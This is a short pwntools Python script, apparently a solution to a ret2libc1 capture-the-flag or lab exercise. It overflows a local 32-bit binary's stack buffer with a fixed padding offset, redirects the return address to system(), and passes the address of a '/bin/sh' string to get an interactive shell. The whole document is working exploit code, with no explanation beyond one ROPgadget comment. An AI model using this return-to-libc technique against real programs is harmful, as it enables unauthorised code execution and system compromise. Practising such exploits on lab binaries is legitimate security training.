#ROPgadget --binary ret2libc1 --string '/bin/sh'
from pwn import *

offset = 0x6c + 4

sh = process(r"../ex1/ret2libc1")
addr_system = 0x08048460
addr_sh = 0x08048720
payload = b'A'*offset + p32(addr_system) + p32(0xcccccccc) + p32(addr_sh)
sh.sendline(payload)
sh.interactive()
